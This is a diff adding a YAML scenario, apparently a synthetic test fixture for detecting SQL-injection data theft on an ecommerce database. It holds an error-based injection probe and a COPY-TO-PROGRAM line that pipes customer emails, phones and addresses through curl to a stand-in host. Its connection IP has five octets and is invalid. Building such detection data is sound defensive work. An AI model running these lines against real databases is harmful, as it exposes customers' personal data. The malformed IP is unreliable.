@@ -1,0 +1,33 @@
+scenario_id: gen_ecommerce_77_sql_injection_mal_2294m
+family_id: gen_ecommerce_77_sql_injection_fam_2294
+domain: ecommerce
+time_of_day: 01:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT order_id, status FROM orders WHERE order_id = CAST((SELECT email FROM
+      customers LIMIT 1) AS INTEGER)
+  - step_id: exfil
+    sql: COPY (SELECT email, phone, shipping_address FROM customers) TO PROGRAM 'curl
+      -sX POST https://deid-partner.example/ingest -d @-'
+    connects_to:
+      ip: 23.129.64.125.238
+      port: 8443
+matched_pair_id: gen_ecommerce_77_sql_injection_pair_2294
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
